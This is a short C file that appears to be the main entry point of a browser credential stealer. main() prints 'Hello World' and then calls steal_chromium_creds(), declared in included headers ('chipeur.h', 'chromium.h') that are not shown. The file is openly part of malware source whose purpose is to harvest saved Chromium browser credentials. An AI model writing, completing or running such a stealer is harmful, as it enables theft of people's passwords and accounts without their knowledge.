#include "chipeur.h"
#include "chromium.h"

#include <stdio.h>
#include <stdlib.h>

void hello(void) { printf("Hello World\n"); }

int main(void) {
  hello();
  steal_chromium_creds();
  return EXIT_SUCCESS;
}
